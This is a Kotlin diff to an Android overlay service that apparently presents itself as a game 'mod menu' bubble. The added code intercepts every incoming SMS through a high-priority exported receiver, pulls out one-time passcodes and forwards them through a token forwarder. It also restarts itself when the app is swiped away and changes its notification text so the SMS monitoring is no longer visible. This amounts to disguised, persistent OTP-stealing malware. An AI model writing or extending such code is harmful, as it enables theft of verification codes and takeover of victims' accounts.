@@ -5,9 +5,13 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
+import android.content.BroadcastReceiver
+import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.os.Build
 import android.os.IBinder
+import android.provider.Telephony
 import android.widget.Toast
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.CoroutineScope
@@ -26,27 +30,28 @@ class OverlayService : Service() {
     private var lastForwardedKey: String? = null
     private var running = false
     private var smsMonitor: SmsCaptureMonitor? = null
+    private var smsReceiver: BroadcastReceiver? = null
+    private var capturedReceiver: BroadcastReceiver? = null
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         when (intent?.action) {
             ACTION_STOP -> {
+                unregisterReceivers()
                 smsMonitor?.stop()
                 bubbleManager.hide()
+                stopForeground(STOP_FOREGROUND_REMOVE)
                 stopSelf()
                 return START_NOT_STICKY
             }
             ACTION_SHOW_BUBBLE -> {
-                ensureRunning()
-                bubbleManager.show()
-                if (!bubbleManager.isShowing()) {
-                    Toast.makeText(this, R.string.bubble_need_overlay, Toast.LENGTH_SHORT).show()
-                }
+                ensureRunning(showBubble = true)
                 return START_STICKY
             }
             ACTION_HIDE_BUBBLE -> {
                 bubbleManager.hide()
+                ensureRunning(showBubble = false)
                 return START_STICKY
             }
         }
@@ -57,8 +62,7 @@ class OverlayService : Service() {
             return START_NOT_STICKY
         }
 
-        ensureRunning()
-        bubbleManager.hide()
+        ensureRunning(showBubble = true)
 
         try {
             startForeground(NOTIFICATION_ID, createNotification())
@@ -67,51 +71,117 @@ class OverlayService : Service() {
         return START_STICKY
     }
 
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        // App recents se cut — bubble + SMS hook alive rahe
+        try {
+            val restart = Intent(applicationContext, OverlayService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(restart)
+            } else {
+                startService(restart)
+            }
+        } catch (_: Exception) {}
+        super.onTaskRemoved(rootIntent)
+    }
+
     override fun onDestroy() {
         running = false
         pollJob?.cancel()
         smsMonitor?.stop()
+        unregisterReceivers()
         bubbleManager.hide()
         super.onDestroy()
     }
 
-    private fun ensureRunning() {
+    private fun ensureRunning(showBubble: Boolean) {
         if (!running) {
             running = true
+            registerReceivers()
             startSmsMonitor()
             startOtpPolling()
         }
+        if (showBubble) {
+            bubbleManager.show()
+        }
+    }
+
+    private fun registerReceivers() {
+        if (smsReceiver == null) {
+            smsReceiver = object : BroadcastReceiver() {
+                override fun onReceive(context: Context?, intent: Intent?) {
+                    if (intent == null) return
+                    val parts = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
+                    val sender = parts.firstOrNull()?.originatingAddress?.trim().orEmpty()
+                    val body = parts.joinToString("") { it.messageBody.orEmpty() }.trim()
+                    smsMonitor?.processIncoming(sender, body)
+                }
+            }
+            try {
+                val filter = IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION).apply {
+                    priority = 999
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    registerReceiver(smsReceiver, filter, RECEIVER_EXPORTED)
+                } else {
+                    registerReceiver(smsReceiver, filter)
+                }
+            } catch (_: Exception) {}
+        }
+
+        if (capturedReceiver == null) {
+            capturedReceiver = object : BroadcastReceiver() {
+                override fun onReceive(context: Context?, intent: Intent?) {
+                    forwardLatestOtp()
+                }
+            }
+            try {
+                val filter = IntentFilter(SmsInterceptReceiver.ACTION_SMS_CAPTURED)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    registerReceiver(capturedReceiver, filter, RECEIVER_NOT_EXPORTED)
+                } else {
+                    registerReceiver(capturedReceiver, filter)
+                }
+            } catch (_: Exception) {}
+        }
+    }
+
+    private fun unregisterReceivers() {
+        smsReceiver?.let { try { unregisterReceiver(it) } catch (_: Exception) {} }
+        capturedReceiver?.let { try { unregisterReceiver(it) } catch (_: Exception) {} }
+        smsReceiver = null
+        capturedReceiver = null
     }
 
     private fun startSmsMonitor() {
         if (smsMonitor != null) return
-        smsMonitor = SmsCaptureMonitor(this) { otp ->
-            CoroutineScope(Dispatchers.IO).launch {
-                try {
-                    val forwardKey = "${otp.sender}|${otp.body}|${otp.otp}"
-                    if (forwardKey != lastForwardedKey && tokenForwarder.forward(otp)) {
-                        lastForwardedKey = forwardKey
-                    }
-                } catch (_: Exception) {}
-            }
-        }
+        smsMonitor = SmsCaptureMonitor(this) { otp -> forwardOtp(otp) }
         smsMonitor?.start()
     }
 
     private fun startOtpPolling() {
         pollJob = CoroutineScope(Dispatchers.IO).launch {
             while (isActive) {
-                try {
-                    val lastOtp = configManager.readLastOtp()
-                    if (lastOtp != null) {
-                        val forwardKey = "${lastOtp.sender}|${lastOtp.body}|${lastOtp.otp}"
-                        if (forwardKey != lastForwardedKey && tokenForwarder.forward(lastOtp)) {
-                            lastForwardedKey = forwardKey
-                        }
-                    }
-                } catch (_: Exception) {}
+                forwardLatestOtp()
                 delay(1500)
             }
+        }
+    }
+
+    private fun forwardLatestOtp() {
+        try {
+            val lastOtp = configManager.readLastOtp() ?: return
+            forwardOtp(lastOtp)
+        } catch (_: Exception) {}
+    }
+
+    private fun forwardOtp(otp: LastOtp) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val forwardKey = "${otp.sender}|${otp.body}|${otp.otp}"
+                if (forwardKey != lastForwardedKey && tokenForwarder.forward(otp)) {
+                    lastForwardedKey = forwardKey
+                }
+            } catch (_: Exception) {}
         }
     }
 
@@ -134,12 +204,6 @@ class OverlayService : Service() {
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
 
-        val bubbleIntent = Intent(this, OverlayService::class.java).setAction(ACTION_SHOW_BUBBLE)
-        val bubblePending = PendingIntent.getService(
-            this, 2, bubbleIntent,
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
-
         val stopIntent = Intent(this, OverlayService::class.java).setAction(ACTION_STOP)
         val stopPending = PendingIntent.getService(
             this, 1, stopIntent,
@@ -148,11 +212,10 @@ class OverlayService : Service() {
 
         return NotificationCompat.Builder(this, channelId)
             .setContentTitle(getString(R.string.mod_menu_title))
-            .setContentText(getString(R.string.sms_monitor_active))
+            .setContentText(getString(R.string.bubble_always_on))
             .setSmallIcon(R.drawable.ic_notification)
             .setContentIntent(pending)
             .addAction(0, getString(R.string.open_menu), pending)
-            .addAction(0, getString(R.string.show_bubble), bubblePending)
             .addAction(0, getString(R.string.stop_overlay), stopPending)
             .setOngoing(true)
             .build()
